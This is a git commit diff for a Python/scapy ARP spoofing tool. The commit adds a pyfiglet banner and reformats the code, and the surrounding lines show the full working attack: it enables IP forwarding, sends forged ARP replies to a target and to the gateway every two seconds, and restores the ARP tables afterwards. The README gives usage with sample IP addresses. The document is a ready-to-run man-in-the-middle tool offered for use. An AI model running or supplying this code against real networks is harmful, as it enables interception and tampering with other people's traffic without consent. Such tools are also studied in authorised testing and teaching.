52c4bc62b2c8f33c2254fc27ae459fd5937c5fa7
Pavlo Teyfel <pavloteyfel@gmail.com>
2022-04-24 21:31:30 +0200

    refactor: Add pyfiglet

--- README.md
+++ README.md
@@ -4,12 +4,19 @@ Python 3.9+ is required, tested on Kali Linux.
 ## Example Usage
 ```shell
 python3 arpspoof.py -h
-usage: spoof.py [-h] target gateway
+    _    ____  ____    ____                     __           
+   / \  |  _ \|  _ \  / ___| _ __   ___   ___  / _| ___ _ __ 
+  / _ \ | |_) | |_) | \___ \| '_ \ / _ \ / _ \| |_ / _ \ '__|
+ / ___ \|  _ <|  __/   ___) | |_) | (_) | (_) |  _|  __/ |   
+/_/   \_\_| \_\_|     |____/| .__/ \___/ \___/|_|  \___|_|   
+                            |_|                              
+
+usage: arpspoof.py [-h] target gateway interface
 
 positional arguments:
   target      Please specify Target IP address
   gateway     Please specify default Gateway IP address
-  interface   Please specity Interface.
+  interface   Please specify the Interface
 
 optional arguments:
   -h, --help  show this help message and exit
@@ -21,9 +28,16 @@ python3 arpspoof.py 192.168.0.17 192.168.0.1 wlan0
 
 Output
 ```
+    _    ____  ____    ____                     __           
+   / \  |  _ \|  _ \  / ___| _ __   ___   ___  / _| ___ _ __ 
+  / _ \ | |_) | |_) | \___ \| '_ \ / _ \ / _ \| |_ / _ \ '__|
+ / ___ \|  _ <|  __/   ___) | |_) | (_) | (_) |  _|  __/ |   
+/_/   \_\_| \_\_|     |____/| .__/ \___/ \___/|_|  \___|_|   
+                            |_|                              
+
 [*] Enabling IP forwarding.
-[*] Gateway 192.168.0.1 is at ac:22:05:4f:f9:1f
-[*] Target 192.168.0.17 is at a4:71:74:43:f9:0f
+[+] Gateway 192.168.0.1 is at ac:22:05:4f:f9:1f
+[+] Target 192.168.0.17 is at a4:71:74:43:f9:0f
 [*] Prepare to send to 192.168.0.17: 192.168.0.1 is at 34:f6:4b:06:0c:f7
 [*] Prepare to send to 192.168.0.1: 192.168.0.17 is at 34:f6:4b:06:0c:f7
 [+] Beginning ARP Spoofing. [CTRL+C to stop]
--- arpspoof.py
+++ arpspoof.py
@@ -2,6 +2,7 @@
 
 from scapy.all import srp, send, Ether, ARP
 from pathlib import Path
+from pyfiglet import figlet_format
 from time import sleep
 import argparse
 import sys
@@ -15,16 +16,20 @@ class Spoofer:
         self.gateway_mac = get_mac(gateway_ip)
         self.interface = interface
         self.print_initialisation()
-    
+
     def print_initialisation(self):
-        print(f"[*] Gateway {self.gateway_ip} is at {self.gateway_mac}")
-        print(f"[*] Target {self.target_ip} is at {self.target_mac}")
-    
+        print(f"[+] Gateway {self.gateway_ip} is at {self.gateway_mac}")
+        print(f"[+] Target {self.target_ip} is at {self.target_mac}")
+
     def run(self):
-        spoof_target = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
-        spoof_gateway = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)
-        print(f"[*] Prepare to send to {self.target_ip}: {self.gateway_ip} is at {spoof_target.hwsrc}")
-        print(f"[*] Prepare to send to {self.gateway_ip}: {self.target_ip} is at {spoof_gateway.hwsrc}")
+        spoof_target = ARP(op=2, psrc=self.gateway_ip,
+                           pdst=self.target_ip, hwdst=self.target_mac)
+        spoof_gateway = ARP(op=2, psrc=self.target_ip,
+                            pdst=self.gateway_ip, hwdst=self.gateway_mac)
+        print(
+            f"[*] Prepare to send to {self.target_ip}: {self.gateway_ip} is at {spoof_target.hwsrc}")
+        print(
+            f"[*] Prepare to send to {self.gateway_ip}: {self.target_ip} is at {spoof_gateway.hwsrc}")
         print("[+] Beginning ARP Spoofing. [CTRL+C to stop]")
 
         try:
@@ -35,23 +40,31 @@ class Spoofer:
                 send(spoof_gateway, verbose=False)
                 sleep(2)
         except KeyboardInterrupt:
-            print("\n\n[!] Detected CTRL+C ... Restoring ARP tables, please Wait.")    
+            print(
+                "\n\n[!] Detected CTRL+C ... Restoring ARP tables, please Wait.")
             self.restore()
         finally:
             sys.exit()
 
     def restore(self):
-        restore_target = ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff")
-        restore_gateway = ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        restore_target = ARP(op=2, psrc=self.gateway_ip, hwsrc=self.gateway_mac,
+                             pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff")
+        restore_gateway = ARP(op=2, psrc=self.target_ip, hwsrc=self.target_mac,
+                              pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff")
         send(restore_target, count=4, verbose=False)
         send(restore_gateway, count=4, verbose=False)
 
+
 def get_arguments():
     parser = argparse.ArgumentParser()
-    parser.add_argument("target", action="store", type=str, help="Please specify Target IP address")
-    parser.add_argument("gateway", action="store", type=str, help="Please specify default Gateway IP address")
-    parser.add_argument("interface", action="store", type=str, help="Please specify the Interface")
+    parser.add_argument("target", action="store", type=str,
+                        help="Please specify Target IP address")
+    parser.add_argument("gateway", action="store", type=str,
+                        help="Please specify default Gateway IP address")
+    parser.add_argument("interface", action="store", type=str,
+                        help="Please specify the Interface")
     return parser.parse_args()
+
 
 def enable_ip_forward():
     path = Path("/proc/sys/net/ipv4/ip_forward")
@@ -68,19 +81,20 @@ def enable_ip_forward():
         print("[-] IP forwarding requires root privileges. QUITTING!")
         sys.exit()
 
-
 def get_mac(ip):
-    answerred, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, retry=8, verbose=False)
+    answerred, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") /
+                       ARP(pdst=ip), timeout=2, retry=8, verbose=False)
     for _, r in answerred:
         return r[Ether].src
 
 
 if __name__ == "__main__":
-    # ip route | grep default | head -1 | cut -d " " -f 3
+    print(figlet_format("ARP Spoofer"))
     arguments = get_arguments()
     target_ip = arguments.target
     gateway_ip = arguments.gateway
     interface = arguments.interface
     enable_ip_forward()
-    spoofer = Spoofer(target_ip=target_ip, gateway_ip=gateway_ip, interface=interface)
+    spoofer = Spoofer(target_ip=target_ip,
+                      gateway_ip=gateway_ip, interface=interface)
     spoofer.run()
